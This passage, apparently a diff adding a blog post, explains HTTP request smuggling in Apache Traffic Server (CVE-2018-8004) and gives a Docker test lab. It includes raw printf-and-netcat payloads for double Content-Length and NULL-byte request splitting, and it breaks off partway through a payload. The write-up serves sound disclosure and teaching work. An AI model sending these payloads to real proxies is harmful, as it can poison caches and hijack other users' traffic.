@@ -1,0 +1,1210 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title> Security: HTTP Smuggling, Apache Traffic Server |  RBleug</title>
+    <meta name="description" content="Regilero's blog; Mostly tech things about web stuff."/>
+    <meta name="author" content="regilero"/>
+    <link rel="author" href="/contact/" title="who am I?" type="text/html" />
+    <link rel="icon" type="image/x-icon" href="/theme/img/regilero.ico" />
+    <link rel="shortcut icon" type="image/x-icon" href="/theme/img/regilero.ico" />
+    <link rel="alternate" type="application/rss+xml" title="RSS Feed" href="/feed.xml" />
+    <link rel="stylesheet" href="/theme/bootstrap/css/bootstrap.min.css" type="text/css">
+    <link rel="stylesheet" href="/theme/bootstrap/css/bootstrap-theme.min.css" type="text/css">
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+<!--
+    <link rel="stylesheet" href="/theme/blueprint/screen.css" type="text/css" media="screen, projection">
+    <link rel="stylesheet" href="/theme/blueprint/print.css" type="text/css" media="print">
+    <link rel="stylesheet" href="/theme/syntax.css" type="text/css" />
+    <!--[if lt IE 8]>
+      <link rel="stylesheet" href="/theme/blueprint/ie.css" type="text/css" media="screen, projection">
+    <![endif]-->
+<!--
+    <link rel="stylesheet" href="/theme/blueprint/plugins/link-icons/screen.css" type="text/css" media="screen, projection">
+    <link rel="stylesheet" href="/theme/fontello/css/fontello.css">
+    <!--[if IE 7]><link rel="stylesheet" href="/theme/fontello/css/fontello-ie7.css"><![endif]-->
+    <link href="/theme/syntax.css" rel="stylesheet" type="text/css" />
+    <link href="/theme/style.css" rel="stylesheet" type="text/css" />
+
+  </head>
+  <body>
+    <div class="topNav navbar navbar-inverse navbar-static-top" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand visible-xs-inline" href="#">Navigation</a>
+        </div>
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+            <li ><a href="/" class="glyphicon glyphicon-home">&nbsp;Home</a></li>
+            <li class="active"><a href="/archives/" class="glyphicon glyphicon-th">&nbsp;Archives</a></li>
+            <li ><a href="/contact/" class="glyphicon glyphicon-earphone">&nbsp;Contact</a></li>
+            <li><a class="glyphicon glyphicon-eye-open" href="/feed.xml">&nbsp;RSS Feed</a></li>
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </div>
+
+  <div class="container" role="main">
+  
+    <div class="jumbotron">
+      <div class="container">
+         <div id="branding">
+           <h1 class="logo"><a href="/">RBleug</a></h1>
+           <hr/>
+           <h2 class="alt">Regilero's blog; Mostly tech things about web stuff.</h2>
+         </div>
+       </div>
+     </div>
+
+    <div class="row">
+      <div class="col-md-8" id="left-content">
+
+          <article>
+        <header>
+            <div class="page-header">
+            <h1>Security: HTTP Smuggling, Apache Traffic Server
+            <br/><span><i class="glyphicon glyphicon-time">&nbsp;</i><time datetime="2019-10-17">Oct 17, 2019</time></span>
+            <span class="category"><i class="glyphicon glyphicon-list">&nbsp;</i> <a href="/english/">english</a> and <a href="/security/">security</a></span>
+            </h1>
+            </div>
+        </header>
+
+        <div class="entry">
+         <div class="col-md-6">
+          <div class="post-excerpt-full">
+          details of CVE-2018-8004 (August 2018 - Apache Traffic Server).
+          </div>
+          <div id="post-toc">
+          </div>
+         </div>
+         <div class="col-md-6">
+          <img class="topimg" src="/theme/img/pic/old15.jpg" alt="details of CVE-2018-8004 (August 2018 - Apache Traffic Server)." title="details of CVE-2018-8004 (August 2018 - Apache Traffic Server)." />
+         </div>
+         <div class="row">
+          <div class="col-md-12" id="post-full">
+       
+          <p><small><strong>English version</strong> (<strong>Version Française</strong> disponible sur <a href="https://www.makina-corpus.com/blog/metier/2018/securite-contrebande-de-http-apache-traffic-server">makina corpus</a>).</small>
+<small>estimated read time: 15 min to really more</small></p>
+
+<h2>What is this about ?</h2>
+
+<p>This article will give a deep explanation of HTTP Smuggling issues present in <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8004">CVE-2018-8004</a>. Firstly because there's currently not much informations about it (<em>"Undergoing Analysis"</em> at the time of this writing on the previous link). Secondly some time has passed since the official announce (and even more since the availability of fixs in v7), also mostly because I keep receiving demands on what exactly is HTTP Smuggling and how to test/exploit this type of issues, also beacause Smuggling issues are now trending and easier to test <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn">thanks for the great stuff of James Kettle</a> (<a href="https://twitter.com/albinowax">@albinowax</a>).</p>
+
+<p>So, this time, I'll give you not only <strong>details</strong> but also a step by step <strong>demo</strong> with some <strong>DockerFiles</strong> to build your own test lab.
+You could use that test lab to experiment it with manual raw queries, or test the recently added <a href="https://portswigger.net/burp/communitydownload">BURP Suite</a> Smuggling tools. I'm really
+a big partisan of always searching for Smuggling issues in non production environements, for legal reasons and also to avoid unattended
+consequences (and we'll see in this article, with the last issue, that unattended behaviors can always happen).</p>
+
+<h2>Apache Traffic Server ?</h2>
+
+<p><a href="http://trafficserver.apache.org/">Apache Traffic Server, or ATS</a> is an Open Source HTTP load balancer and Reverse Proxy Cache. Based on a Commercial product donated to the Apache Foundation. It's not related to Apache httpd HTTP server, the "Apache" name comes from the Apache foundation, the code is very different
+from httpd.</p>
+
+<p>If you were to search from ATS installations <a href="https://www.shodan.io/search?query=Server%3A+ATS">on the wild</a> you would find some, hopefully fixed now.</p>
+
+<h3>Fixed versions of ATS</h3>
+
+<p>As stated in the <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8004">CVE announce</a> (2018-08-28) impacted ATS versions are versions <strong>6.0.0 to 6.2.2</strong> and <strong>7.0.0 to 7.1.3</strong>. Version 7.1.4 was released in 2018-08-02 and 6.2.3 in 2018-08-04. That's the offical announce, but I think 7.1.3 contained most of the fixs already, and is maybe not vulnerable. The announce was mostly delayed for 6.x backports (and some other fixs are relased in the same time, on other issues).</p>
+
+<p>If you wonder about previous versions, like 5.x, they're out of support, and quite certainly vulnerable. <strong>Do not use out of support versions.</strong></p>
+
+<h2>CVE-2018-8004</h2>
+
+<p>The <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8004">official CVE description</a> is:</p>
+
+<blockquote><p>There are multiple HTTP smuggling and cache poisoning issues when clients making malicious requests interact with ATS.</p></blockquote>
+
+<p>Which does not gives a lot of pointers, but there's much more information in the 4 pull requests listed:</p>
+
+<ul>
+<li><a href="https://github.com/apache/trafficserver/pull/3192">#3192: Return 400 if there is whitespace after the field name and before the colon</a></li>
+<li><a href="https://github.com/apache/trafficserver/pull/3201">#3201: Close the connection when returning a 400 error response</a></li>
+<li><a href="https://github.com/apache/trafficserver/pull/3231">#3231: Validate Content-Length headers for incoming requests </a></li>
+<li><a href="https://github.com/apache/trafficserver/pull/3251">#3251:  Drain the request body if there is a cache hit</a></li>
+</ul>
+
+
+<p>If you already studied some of my previous posts, some of these sentences might already seems dubious. For example not closing a response stream after an error 400 is clearly a fault, based on the standards, but is also a good catch for an attacker. Chances are that crafting a bad messages chain you may succeed at receiving a response for some queries hidden in the body of an invalid request.</p>
+
+<p>The last one, <em>Drain the request body if there is a cache hit</em> is the nicest one, as we will see on this article, and it was hard to detect.</p>
+
+<p>My original report listed 5 issues:</p>
+
+<ul>
+<li><strong>HTTP request splitting</strong> using NULL character in header value</li>
+<li><strong>HTTP request splitting</strong> using huge header size</li>
+<li><strong>HTTP request splitting</strong> using double Content-length headers</li>
+<li><strong>HTTP cache poisoning</strong> using extra space before separator of header name and header value</li>
+<li><strong>HTTP request splitting</strong> using ...<em>(no spoiler: I keep that for the end)</em></li>
+</ul>
+
+
+<h2>Step by step Proof of Concept</h2>
+
+<p>To understand the issues, and see the effects, We will be using a demonstration/research environment.</p>
+
+<p><strong>If you either want to test HTTP Smuggling issues you should really, really, try to test it on a controlled environment. Testing issues on live environments would be difficult because:</strong></p>
+
+<ul>
+<li><strong>You may have some very good HTTP agents (load balancers, SSL terminators, security filters) between you and your target, hiding most of your success and errors.</strong></li>
+<li><strong>You may triggers errors and behaviors that you have no idea about, for example I have encountered random errors on several fuzzing tests (on test envs), unreproductible, before understanding that this was related to the last smuggling issue we will study on this article. Effects were delayed on subsequent tests, and I was not in control, at all.</strong></li>
+<li><strong>You may trigger errors on requests sent by other users, and/or for other domains. That's not like testing a self reflected XSS, you could end up in a court for that.</strong></li>
+<li><strong>Real life complete examples usually occurs with interactions between several different HTTP agents, like Nginx + Varnish, or ATS + HaProxy, or Pound + IIS + Nodejs, etc. You will have to understand how each actor interact with the other, and you will see it faster with a local low level network capture than blindly accross an unknown chain of agents (like for example to learn how to detect each agent on this chain).</strong></li>
+</ul>
+
+
+<p>So it's very important to be able to rebuild a laboratory env.</p>
+
+<p>And, if you find something, this env can then be used to send detailled bug reports to the program owners (in my own experience, it can sometimes be quite difficult to explain the issues, a working demo helps).</p>
+
+<h3>Set-up the lab: Docker instances</h3>
+
+<p>We will run 2 Apache Traffic Server Instance, one in version 6.x and one in version 7.x.</p>
+
+<p>To add some alterity, and potential smuggling issues, we will also add an Nginx docker, and an HaProy one.</p>
+
+<p>4 HTTP actors, each one on a local port:</p>
+
+<ul>
+<li><strong>127.0.0.1:8001</strong> : <a href="https://www.haproxy.org/">HaProxy</a> (internally listening on port <strong>80</strong>)</li>
+<li><strong>127.0.0.1:8002</strong> : Nginx (internally listening on port <strong>80</strong>)</li>
+<li><strong>127.0.0.1:8007</strong> : ATS7 (internally listening on port <strong>8080</strong>)</li>
+<li><strong>127.0.0.1:8006</strong> : ATS6 (internally listening on port <strong>8080</strong>), most examples will use ATS7, but you will ba able to test this older version simply using this port instead of the other (and altering the domain).</li>
+</ul>
+
+
+<p>We will chain some Reverse Proxy relations, Nginx will be the final backend, HaProxy the front load balancer, and between Nginx and HaProxy we will go through ATS6 or ATS7 based on the domain name used (<strong>dummy-host7.example.com</strong> for ATS7 and <strong>dummy-host6.example.com</strong> for ATS6)</p>
+
+<p>Note that the <strong>localhost port mapping</strong> of the ATS and Nginx instances are not directly needed, if you can inject a request to Haproxy it will reach Nginx internally, via port 8080 of one of the ATS, and port 80 of Nginx. But that could be usefull if you want to target directly one of the server, and we will have to avoid the HaProxy part on most examples, because most attacks would be blocked by this load balancer. So most examples will directly target the ATS7 server first, on 8007. Later you can try to suceed targeting 8001, that will be harder.</p>
+
+<pre><code>                       +---[80]---+
+                       | 8001-&gt;80 |
+                       |  HaProxy |
+                       |          |
+                       +--+---+---+
+[dummy-host6.example.com] |   | [dummy-host7.example.com]
+                  +-------+   +------+
+                  |                  |
+              +-[8080]-----+     +-[8080]-----+
+              | 8006-&gt;8080 |     | 8007-&gt;8080 |
+              |  ATS6      |     |  ATS7      |
+              |            |     |            |
+              +-----+------+     +----+-------+
+                    |               |
+                    +-------+-------+
+                            |
+                       +--[80]----+
+                       | 8002-&gt;80 |
+                       |  Nginx   |
+                       |          |
+                       +----------+
+</code></pre>
+
+<p>To build this cluster we will use docker-compose, You can the find the <a href="//regilero.github.io/theme/resource/ats/docker-compose.yml">docker-compose.yml file here</a>, but the content is quite short:</p>
+
+<div class="highlight"><pre><code class="language-yaml" data-lang="yaml"><span class="l-Scalar-Plain">version</span><span class="p-Indicator">:</span> <span class="s">&#39;3&#39;</span>
+<span class="l-Scalar-Plain">services</span><span class="p-Indicator">:</span>
+  <span class="l-Scalar-Plain">haproxy</span><span class="p-Indicator">:</span>
+    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">haproxy:1.6</span>
+    <span class="l-Scalar-Plain">build</span><span class="p-Indicator">:</span>
+      <span class="l-Scalar-Plain">context</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">.</span>
+      <span class="l-Scalar-Plain">dockerfile</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Dockerfile-haproxy</span>
+    <span class="l-Scalar-Plain">expose</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">80</span>
+    <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="s">&quot;8001:80&quot;</span>
+    <span class="l-Scalar-Plain">links</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">ats7:linkedats7.net</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">ats6:linkedats6.net</span>
+    <span class="l-Scalar-Plain">depends_on</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">ats7</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">ats6</span>
+  <span class="l-Scalar-Plain">ats7</span><span class="p-Indicator">:</span>
+    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">centos:7</span>
+    <span class="l-Scalar-Plain">build</span><span class="p-Indicator">:</span>
+      <span class="l-Scalar-Plain">context</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">.</span>
+      <span class="l-Scalar-Plain">dockerfile</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Dockerfile-ats7</span>
+    <span class="l-Scalar-Plain">expose</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">8080</span>
+    <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="s">&quot;8007:8080&quot;</span>
+    <span class="l-Scalar-Plain">depends_on</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">nginx</span>
+    <span class="l-Scalar-Plain">links</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">nginx:linkednginx.net</span>
+  <span class="l-Scalar-Plain">ats6</span><span class="p-Indicator">:</span>
+    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">centos:7</span>
+    <span class="l-Scalar-Plain">build</span><span class="p-Indicator">:</span>
+      <span class="l-Scalar-Plain">context</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">.</span>
+      <span class="l-Scalar-Plain">dockerfile</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Dockerfile-ats6</span>
+    <span class="l-Scalar-Plain">expose</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">8080</span>
+    <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="s">&quot;8006:8080&quot;</span>
+    <span class="l-Scalar-Plain">depends_on</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">nginx</span>
+    <span class="l-Scalar-Plain">links</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">nginx:linkednginx.net</span>
+  <span class="l-Scalar-Plain">nginx</span><span class="p-Indicator">:</span>
+    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">nginx:latest</span>
+    <span class="l-Scalar-Plain">build</span><span class="p-Indicator">:</span>
+      <span class="l-Scalar-Plain">context</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">.</span>
+      <span class="l-Scalar-Plain">dockerfile</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Dockerfile-nginx</span>
+    <span class="l-Scalar-Plain">expose</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">80</span>
+    <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
+      <span class="p-Indicator">-</span> <span class="s">&quot;8002:80&quot;</span></code></pre></div>
+
+
+<p>To make this work you will also need the 4 specific Dockerfiles:</p>
+
+<ul>
+<li><a href="//regilero.github.io/theme/resource/ats/Dockerfile-haproxy">Docker-haproxy: an HaProxy Dockerfile, with the right conf</a></li>
+<li><a href="//regilero.github.io/theme/resource/ats/Dockerfile-nginx">Docker-nginx: A very simple Nginx Dockerfile with one index.html page</a></li>
+<li><a href="//regilero.github.io/theme/resource/ats/Dockerfile-ats7">Docker-ats7: An ATS 7.1.1 compiled from archive Dockerfile</a></li>
+<li><a href="//regilero.github.io/theme/resource/ats/Dockerfile-ats6">Docker-ats6: An ATS 6.2.2 compiled from archive Dockerfile</a></li>
+</ul>
+
+
+<p>Put all theses files (the <code>docker-compose.yml</code> and the <code>Dockerfile-*</code> files) into a working directory and run in this dir:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">docker-compose build <span class="o">&amp;&amp;</span> docker-compose up</code></pre></div>
+
+
+<p>You can now take a <strong>big break</strong>, you are launching two compilations of ATS. Hopefully the next time a <code>up</code> will be enough, and even the <code>build</code> may not redo the compilation steps.</p>
+
+<p>You can easily add another <code>ats7-fixed</code> element on the cluster, to test fixed version of ATS if you want. For now we will concentrate on detecting issues in flawed versions.</p>
+
+<h3>Test That Everything Works</h3>
+
+<p>We will run <strong>basic non attacking queries</strong> on this installation, to check that everything is working, and to train ourselves on the <code>printf + netcat</code> way of running queries. We will not use curl or wget to run HTTP query, because that would be impossible to write bad queries. So we need to use low level string manipulations (with <code>printf</code> for example) and socket handling (with <code>netcat</code> -- or <code>nc</code> --).</p>
+
+<p>Test Nginx (that's a one-liner splitted for readability):</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span> nc 127.0.0.1 8002</code></pre></div>
+
+
+<p>You should get the <code>index.html</code> response, something like:</p>
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.15.5</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 15:28:20 GMT</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">120</span>
+<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 14:16:28 GMT</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">ETag</span><span class="o">:</span> <span class="l">&quot;5bd321bc-78&quot;</span>
+<span class="na">X-Location-echo</span><span class="o">:</span> <span class="l">/</span>
+<span class="na">X-Default-VH</span><span class="o">:</span> <span class="l">0</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">public, max-age=300</span>
+<span class="na">Accept-Ranges</span><span class="o">:</span> <span class="l">bytes</span>
+
+$<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Nginx default static page<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;h1&gt;</span>Hello World<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>It works!<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span></code></pre></div>
+
+
+<p>Then test ATS7 and ATS6:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span> nc 127.0.0.1 8007
+
+<span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host6.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span> nc 127.0.0.1 8006</code></pre></div>
+
+
+<p>Then test HaProxy, altering the <code>Host</code> name should make the transit via ATS7 or ATS6 (check the <code>Server:</code> header response):</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span> nc 127.0.0.1 8001
+
+<span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host6.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span> nc 127.0.0.1 8001</code></pre></div>
+
+
+<p>And now let's start a more complex HTTP stuff, we will make an <strong>HTTP pipeline</strong>, pipelining several queries and receiving several responses, as pipelining is the <strong>root</strong> of most smuggling attacks:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># send one pipelined chain of queries</span>
+<span class="nb">printf</span> <span class="s1">&#39;GET /?cache=1 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET /?cache=2 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET /?cache=3 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host6.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET /?cache=4 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:dummy-host6.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span> nc 127.0.0.1 8001</code></pre></div>
+
+
+<p>This is <strong>pipelining</strong>, it's not only using <strong>HTTP keepAlive</strong>, because we send the chain of queries without waiting for the responses. See <a href="https://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/#toc4">my previous post</a> for detail on Keepalives and Pipelining.</p>
+
+<p>You should get the <strong>Nginx access log</strong> on the docker-compose output, if you do not <strong>rotate some arguments</strong> in the query nginx wont get reached by your requests, because ATS is caching the result already (<code>CTRL+C</code> on the docker-compose output and <code>docker-compose up</code> will remove any cache).</p>
+
+<h2>Request Splitting by Double Content-Length</h2>
+
+<p>Let's start a real play. That's the 101 of HTTP Smuggling. The <em>easy</em> vector. <strong>Double Content-Length header support is strictly forbidden</strong> by the <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC 7230 3.3.3</a> (bold added):</p>
+
+<blockquote><p><strong>4</strong> If a message is received without Transfer-Encoding and with
+   either <strong>multiple Content-Length header fields having differing
+   field-values</strong> or a single Content-Length header field having an
+   invalid value, then the message framing is invalid and the
+   recipient <strong>MUST treat it as an unrecoverable error</strong>. If this is
+   a request message, the server MUST respond with a 400 (Bad Request)
+   status code and then close the connection.  If this is a response
+   message received by a proxy, the proxy MUST close the connection
+   to the server, discard the received response, and send a 502 (Bad
+   Gateway) response to the client.  If this is a response message
+   received by a user agent, the user agent MUST close the
+   connection to the server and discard the received response.</p></blockquote>
+
+<p>Differing interpretations of message length based on the order of Content-Length headers were the first demonstrated HTTP smuggling attacks (2005).</p>
+
+<p>Sending such query directly on ATS generates 2 responses (one 400 and one 200):</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET /index.html?toto=1 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Content-Length: 0\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Content-Length: 66\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET /index.html?toto=2 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8007</code></pre></div>
+
+
+<p>The regular response should be one error 400.</p>
+
+<p>Using port 8001 (HaProxy) would not work, HaProxy is a robust HTTP agent and cannot be fooled by such an easy trick.</p>
+
+<p>This is <strong>Critical</strong> Request Splitting, classical, but hard to reproduce in real life environment if some robust tools are used on the reverse proxy chain. So, <strong>why critical?</strong> Because you could also consider ATS to be robust, and use a new unknown HTTP server behind or in front of ATS and expect such smuggling attacks to be properly detected.</p>
+
+<p>And there is another factor of criticality, any other issue on HTTP parsing can exploit this Double Content-Length. Let's say you have another issue which allows you to hide one header for all other HTTP actors, but reveals this header to ATS. Then you just have to use this hidden header for a second Content-length and you're done, without being blocked by a previous actor. On our current case, ATS, you have one example of such hidden-header issue with the 'space-before-:' that we will analyze later.</p>
+
+<h2>Request Splitting by NULL Character Injection</h2>
+
+<p>This example is not the easiest one to understand (go to the next one if you do not get it, or even the one after), that's also not the biggest impact, as we will use a really bad query to attack, easily detected. But I love the magical <strong>NULL</strong> (<code>\0</code>) character.</p>
+
+<p>Using a NULL byte character in a header triggers a query rejection on ATS, that's ok, but also a <strong>premature end of query</strong>, and if you do not close pipelines after a first error, bad things could happen. Next line is interpreted as next query in pipeline.</p>
+
+<p>So, a valid (almost, if you except the NULL character) pipeline like this one:</p>
+
+<pre><code> 01 GET /does-not-exists.html?foofoo=1 HTTP/1.1\r\n
+ 02 X-Something: \0 something\r\n
+ 03 X-Foo: Bar\r\n
+ 04 \r\n
+ 05 GET /index.html?bar=1 HTTP/1.1\r\n
+ 06 Host: dummy-host7.example.com\r\n
+ 07 \r\n
+</code></pre>
+
+<p>Generates 2 error 400. because the second query is starting with <code>X-Foo: Bar\r\n</code> and that's
+an invalid first query line.</p>
+
+<p>Let's test an invalid pipeline (as there'is no <code>\r\n</code> between the 2 queries):</p>
+
+<pre><code> 01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
+ 02 X-Something: \0 something\r\n
+ 03 GET /index.html?bar=2 HTTP/1.1\r\n
+ 04 Host: dummy-host7.example.com\r\n
+ 05 \r\n
+</code></pre>
+
+<p>It generates 1 error 400 and one 200 OK response. Lines <strong>03/04/05</strong> are taken as a valid query.</p>
+
+<p>This is already an HTTP request Splitting attack.</p>
+
+<p>But line <strong>03</strong> is a really bad header line that most agent would reject. You cannot read that as a valid unique query. The fake pipeline would be detected early as a bad query, I mean line 03 is clearly not a valid header line.</p>
+
+<pre><code>GET /index.html?bar=2 HTTP/1.1\r\n
+ !=
+&lt;HEADER-NAME-NO-SPACE&gt;[:][SP]&lt;HEADER-VALUE&gt;[CR][LF]
+</code></pre>
+
+<p>For the first line the syntax is one of these two lines:</p>
+
+<pre><code>&lt;METHOD&gt;[SP]&lt;LOCATION&gt;[SP]HTTP/[M].[m][CR][LF]
+&lt;METHOD&gt;[SP]&lt;http[s]://LOCATION&gt;[SP]HTTP/[M].[m][CR][LF] (absolute uri)
+</code></pre>
+
+<p><code>LOCATION</code> may be used to inject the special <code>[:]</code> that is required in an header line, especially on the query string part,
+but this would inject a lot of bad characters in the <code>HEADER-NAME-NO-SPACE</code> part, like '/' or '?'.</p>
+
+<p>Let's try with the ABSOLUTE-URI alternative syntax, where the <code>[:]</code> comes faster on the line, and the only bad character for an Header name would be the space. This will also fix the potential presence of the double Host header (absolute uri does replace the Host header).</p>
+
+<pre><code> 01 GET /does-not-exists.html?foofoo=2 HTTP/1.1\r\n
+ 02 Host: dummy-host7.example.com\r\n
+ 03 X-Something: \0 something\r\n
+ 04 GET http://dummy-host7.example.com/index.html?bar=2 HTTP/1.1\r\n
+ 05 \r\n
+</code></pre>
+
+<p>Here the bad header which becomes a query is line <strong>04</strong>, and the <strong>header name</strong> is <code>GET http</code> with an header value of <code>//dummy-host7.example.com/index.html?bar=2 HTTP/1.1</code>. That's still an invalid header (the header name contains a space) but I'm pretty sure we could find some HTTP agent transferring this header (ATS is one proof of that, space character in header names were allowed).</p>
+
+<p>A real attack using this trick will looks like this:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET /something.html?zorg=1 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
